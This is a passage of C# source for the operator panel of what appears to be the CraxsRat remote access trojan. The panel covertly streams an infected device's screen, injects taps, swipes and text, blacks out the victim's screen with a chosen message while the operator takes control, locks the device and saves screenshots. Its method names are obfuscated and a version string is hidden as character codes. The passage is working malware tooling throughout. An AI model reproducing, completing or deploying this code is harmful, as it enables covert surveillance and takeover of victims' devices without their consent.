            this.SPanel1.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox18)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox14)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox8)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox10)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Livepicbox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox13)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox17)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox12)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox16)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox9)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox11)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox3)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button5)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button7)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.Button6)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox4)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox15)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

    }

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

    private void trans()
    {
        string language = RegistryHandler.Get_Language();
        if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
        {
            if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
            {
                Save.Text = "节省";
                checkblock.Text = "屏幕阻挡";
                chkctrl.Text = "允许控制";
                StartButton.Text = Codes.Translate(StartButton.Text, "en", "zh");
                StopButton.Text = Codes.Translate(StopButton.Text, "en", "zh");
            }
        }
        else
        {
            Save.Text = "حفظ";
            checkblock.Text = "حظر";
            chkctrl.Text = "تحكم";
            StartButton.Text = Codes.Translate(StartButton.Text, "en", "ar");
            StopButton.Text = Codes.Translate(StopButton.Text, "en", "ar");
        }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs(object sender, EventArgs e)
    {
        combosize.Items.Clear();
        trans();
        string[] array = sizearry;
        foreach (string item in array)
        {
            combosize.Items.Add(item);
        }
        //ShowTipform showTipform = new ShowTipform(RegistryHandler.ShowScrenShotTip, Resources.Tip_screenctrol);
        string text = RegistryHandler.GET_Tip(RegistryHandler.ShowScrenShotTip);
        bool flag = true;
        if (text != null)
        {
            if (Operators.CompareString(text, "no", TextCompare: false) == 0)
                flag = false;
        }
        else
            flag = true;
        if (flag)
        //    showTipform.ShowDialog();
       // showTipform.Dispose();
        base.KeyPreview = true;
        base.Tag = classClient.ClientRemoteAddress;
        toptitle.Text = " ";
        combosize.Text = "Auto";
        PictureBox2.Image = classClient.Wallpaper;
        PictureBox3.Image = classClient.Flag;
        base.TransparencyKey = Color.FromArgb(45, 45, 45);
        BackColor = Color.FromArgb(45, 45, 45);
        Qualtibox.Text = MySettingsProperty.Settings.live_sc_qulty;
        int num = 2;
        checked
        {
            do
            {
                FPSBOX.Items.Add(num.ToString());
                num++;
            }
            while (num <= 30);
            FPSBOX.Text = "30";
            Qualtibox.Items.Clear();
            int num2 = 1;
            do
            {
                Qualtibox.Items.Add(num2.ToString());
                num2++;
            }
            while (num2 <= 100);
            Qualtibox.Text = "50";
            PBS.MinimumSize = new Size(0, 0);
            PBS.Size = new Size(384, 5);
            PBS.Width = 384;
            PBS.Height = 5;
            SetWindowPos(hWndInsertAfter: new IntPtr(-2), hWnd: base.Handle, X: 0, Y: 0, cx: 0, cy: 0, uFlags: 3u);
            keepmeto = true;
        }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscdasjj(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>U" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcds(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>D" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Button3_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>L" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void Button4_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>R" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    public void Viewdimiss()
    {
    }

    private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
    {
        ScreenShotFoucs = false;
        Dismisbtn.Visible = false;
        if (e.Button == MouseButtons.Left)
        {
            Trakpoint = new List<Point>();
            Trakpoint.Add(new Point(e.X, e.Y));
            isclick = false;
            isdown = true;
        }
        else
        {
            presstimer.Enabled = true;
            isclick = true;
        }
    }

    private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
    {
        isdown = false;
        int num = Livepicbox.Width;
        int num2 = Livepicbox.Height;
        checked
        {
            if (!isclick)
            {
                if (!Swaping)
                    return;
                Swaping = false;
                Trakpoint.Add(new Point(e.X, e.Y));
                StringBuilder stringBuilder = new StringBuilder();
                foreach (Point item in Trakpoint)
                {
                    stringBuilder.Append(new Point((int)Math.Round((double)item.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)item.Y * ((double)ScreenSize.Height / (double)num2))).ToString() + ":");
                }
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + stringBuilder.ToString() + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
                return;
            }
            presstimer.Enabled = false;
            presstimer.Stop();
            string text = "clk:";
            if (tiks > 3)
                text = "clk:hold:";
            tiks = 0;
            Point point = Livepicbox.PointToClient(Control.MousePosition);
            if (Operators.CompareString(combosize.Text, "Auto", TextCompare: false) != 0)
            {
                string[] array2 = combosize.Text.Split('x');
                ScreenSize = new Size(Conversions.ToInteger(array2[1]), Conversions.ToInteger(array2[0]));
            }
            Point point2 = new Point((int)Math.Round((double)point.X * ((double)ScreenSize.Width / (double)num)), (int)Math.Round((double)point.Y * ((double)ScreenSize.Height / (double)num2)));
            text = text + point2.X + ":" + point2.Y;
            string[] array3 = classClient.Keys.Split(':');
            object[] parametersObjects2 = new object[4]
            {
                Client,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>" + text + Data.SPL_SOCKET + array3[0] + Data.SPL_SOCKET + array3[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects2);
        }
    }

    private void PictureBox1_MouseMove(object sender, MouseEventArgs e)
    {
        if (isdown)
        {
            Swaping = true;
            isclick = false;
            if (e.X > 0 && e.Y > 0)
                Trakpoint.Add(new Point(e.X, e.Y));
        }
    }

    private void Button1_Click_2(object sender, EventArgs e)
    {
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsgfnbwq(object sender, EventArgs e)
    {
    }

    private void Autosave_CheckedChanged(object sender)
    {
    }

    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

    [DllImport("user32.dll")]
    public static extern bool ReleaseCapture();

    private void Panel2_MouseDown(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            ReleaseCapture();
            SendMessage(base.Handle, 161, 2, 0);
        }
    }

    private void Panel3_MouseDown(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            ReleaseCapture();
            SendMessage(base.Handle, 161, 2, 0);
        }
    }

    private void Panel4_MouseDown(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            ReleaseCapture();
            SendMessage(base.Handle, 161, 2, 0);
        }
    }

    private void Button1_Click_3(object sender, EventArgs e)
    {
    }

    public string Clientout(string timeoutmil)
    {
        string[] array = (timeoutmil + "\u200b97\u200b120\u200b115\u200b32\u200b82\u200b97\u200b116\u200b32\u200b86\u200b52").Replace("\u200b", " ").Split(' ');
        string text = "";
        string[] array2 = array;
        foreach (string text2 in array2)
        {
            if (text2.Length > 0)
                text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
        }
        return text;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscajhg(object sender, FormClosingEventArgs e)
    {
        base.Name = null;
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:off" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                toptitle.Text = "...";
                classClient.SendMessage(parametersObjects);
                StartButton.Enabled = true;
                StopButton.Enabled = false;
                toptitle.Text = " ";
                vewpnl.Enabled = false;
                Livepicbox.Enabled = false;
                LIVE = false;
                refreshtimer.Stop();
                PBS.Value = 0;
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
        Dispose();
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        if (Save.Checked)
        {
            if (!Directory.Exists(DownloadsFolder + "\\ScreenShots"))
                Directory.CreateDirectory(DownloadsFolder + "\\ScreenShots");
            try
            {
                Livepicbox.Image.Save(DownloadsFolder + "\\ScreenShots\\IMG-" + DateTime.Now.Day + "-" + DateTime.Now.Month + "-" + DateTime.Now.Millisecond + ".png");
                return;
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
                return;
            }
        }
        Timer1.Stop();
    }

    private void Refreshtimer_Tick(object sender, EventArgs e)
    {
        checked
        {
            if (LIVE)
            {
                if (Rnew == 0)
                    return;
                try
                {
                    if (PBS.Value < PBS.Maximum)
                        PBS.Value++;
                    else
                        PBS.Value = 0;
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
                Rnew = 0;
            }
            else
            {
                refreshtimer.Stop();
                refreshtimer.Enabled = false;
            }
        }
    }

    public void Done(object[] objs)
    {
        if (toptitle.InvokeRequired)
        {
            addLogback method = Done;
            toptitle.Invoke(method, new object[1] { objs });
        }
        else
        {
            string text = Conversions.ToString(objs[0]);
            toptitle.Text = text;
        }
    }

    private void Presstimer_Tick(object sender, EventArgs e)
    {
        checked
        {
            tiks++;
        }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjkhsdawe(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LK" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxsxaj(object sender, EventArgs e)
    {
        Livepicbox.Enabled = true;
        LIVE = true;
        if (Operators.CompareString(SKtype.Text, "Slient", TextCompare: false) == 0)
        {
            if (classClient != null)
                try
                {
                    string[] array = classClient.Keys.Split(':');
                    object[] parametersObjects = new object[4]
                    {
                        Client,
                        SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>SK" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                        Codes.Encoding().GetBytes("null"),
                        classClient
                    };
                    classClient.SendMessage(parametersObjects);
                }
                catch (Exception)
                {
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
        }
        else if (classClient != null)
        {
            try
            {
                string[] array2 = classClient.Keys.Split(':');
                object[] parametersObjects2 = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>SK2" + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects2);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError2);
                //////CraxsAlert.Showinformation("Sorry");
            }
        }
    }

    private void Dismisbtn_Click(object sender, EventArgs e)
    {
        if (Livepicbox.Image != null)
        {
            Livepicbox.Image = null;
            ScreenShotFoucs = false;
            Dismisbtn.Visible = false;
        }
    }

    private void Checkblock_MouseClick(object sender, MouseEventArgs e)
    {
        TcpClient myClient = classClient.myClient;
        string[] array = classClient.Keys.Split(':');
        if (checkblock.Checked)
        {
            if (classClient != null)
            {
                Dialog1 dialog = new Dialog1();
                dialog.Title = "Blocking message (optional)";
                dialog.ShowDialog();
                if (dialog.DialogResult == DialogResult.OK)
                {
                    object[] parametersObjects = new object[4]
                    {
                        myClient,
                        SecurityKey.KeysClient2 + Data.SPL_SOCKET + "Blkt<*>" + dialog.TheText + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                        Codes.Encoding().GetBytes("null"),
                        classClient
                    };
                    classClient.SendMessage(parametersObjects);
                }
                chkctrl.Enabled = true;
                object[] parametersObjects2 = new object[4]
                {
                    myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "BLKV<*>on" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects2);
            }
        }
        else if (classClient != null)
        {
            chkctrl.Enabled = false;
            object[] parametersObjects3 = new object[4]
            {
                myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "BLKV<*>off" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects3);
        }
    }









    private void ScreenShoter_KeyDown(object sender, KeyEventArgs e)
    {
    }

    private void ScreenShoter_KeyUp(object sender, KeyEventArgs e)
    {
    }

    private void Save_MouseClick(object sender, MouseEventArgs e)
    {
        if (Save.Checked)
            Timer1.Start();
        else
            Timer1.Stop();
    }

    private void DrakeUIAvatar3_Click(object sender, EventArgs e)
    {
        if (classClient != null && !LIVE)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:on:" + Qualtibox.Text + "~" + FPSBOX.Text + "~" + classClient.ClientRemoteAddress + "~" + MySettingsProperty.Settings.resolution + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
                toptitle.Text = "Connecting , Please Wait...";
                StartButton.Enabled = false;
                StopButton.Enabled = true;
                vewpnl.Enabled = true;
                Livepicbox.Enabled = true;
                LIVE = true;
                refreshtimer.Enabled = true;
                refreshtimer.Start();
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void DrakeUIAvatar6_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LKOS" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
        Close();
    }

    private void Chkctrl_MouseClick(object sender, MouseEventArgs e)
    {
        if (chkctrl.Checked)
        {
            if (LIVE && checkblock.Checked)
            {
                iscontroled = true;
                if (classClient != null)
                {
                    string[] array = classClient.Keys.Split(':');
                    object[] parametersObjects = new object[4]
                    {
                        classClient.myClient,
                        SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pslock<*>allow" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                        Codes.Encoding().GetBytes("null"),
                        classClient
                    };
                    classClient.SendMessage(parametersObjects);
                }
            }
        }
        else if (Conversions.ToBoolean(iscontroled) && classClient != null)
        {
            string[] array2 = classClient.Keys.Split(':');
            object[] parametersObjects2 = new object[4]
            {
                classClient.myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pslock<*>disallow" + Data.SPL_SOCKET + array2[0] + Data.SPL_SOCKET + array2[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects2);
        }
    }

    private void DrakeUIAvatar5_Click(object sender, EventArgs e)
    {
        base.WindowState = FormWindowState.Minimized;
    }

    private void DrakeUIAvatar3_Click_1(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Bc" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void DrakeUIAvatar4_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>Ho" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void DrakeUIAvatar7_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>RC" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void StopButton_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sc:off" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                toptitle.Text = "...";
                classClient.SendMessage(parametersObjects);
                StartButton.Enabled = true;
                StopButton.Enabled = false;
                toptitle.Text = " ";
                vewpnl.Enabled = false;
                Livepicbox.Enabled = false;
                LIVE = false;
                refreshtimer.Stop();
                PBS.Value = 0;
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void ScreenShoter_KeyDown_1(object sender, KeyEventArgs e)
    {
        char c = Conversions.ToChar(MyProject.Computer.Keyboard.CapsLock ? Conversions.ToString(Strings.ChrW((int)e.KeyCode)) : Strings.ChrW((int)e.KeyCode).ToString().ToLower());
        Console.WriteLine("Key Pressed: " + Conversions.ToString(c));
    }

    private void DrakeUIAvatar2_Click(object sender, EventArgs e)
    {
        if (classClient != null && textsend.Text.Length > 0)
        {
            object[] parametersObjects = new object[4]
            {
                classClient.myClient,
                SecurityKey.KeysClient2 + Data.SPL_SOCKET + "pst<*>" + textsend.Text + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + "0" + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                Codes.Encoding().GetBytes("null"),
                classClient
            };
            classClient.SendMessage(parametersObjects);
            textsend.Text = "";
        }
    }

    private void DrakeUIAvatar8_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    classClient.myClient,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>En" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
            {
                //ProjectData.SetProjectError(projectError);
                //////CraxsAlert.Showinformation("Sorry");
            }
    }

    private void DrakeUIAvatar9_Click(object sender, EventArgs e)
    {
        if (classClient != null)
            try
            {
                string[] array = classClient.Keys.Split(':');
                object[] parametersObjects = new object[4]
                {
                    Client,
                    SecurityKey.KeysClient2 + Data.SPL_SOCKET + "sp<*>LKeb" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + classClient.ClientRemoteAddress,
                    Codes.Encoding().GetBytes("null"),
                    classClient
                };
                classClient.SendMessage(parametersObjects);
            }
            catch (Exception)
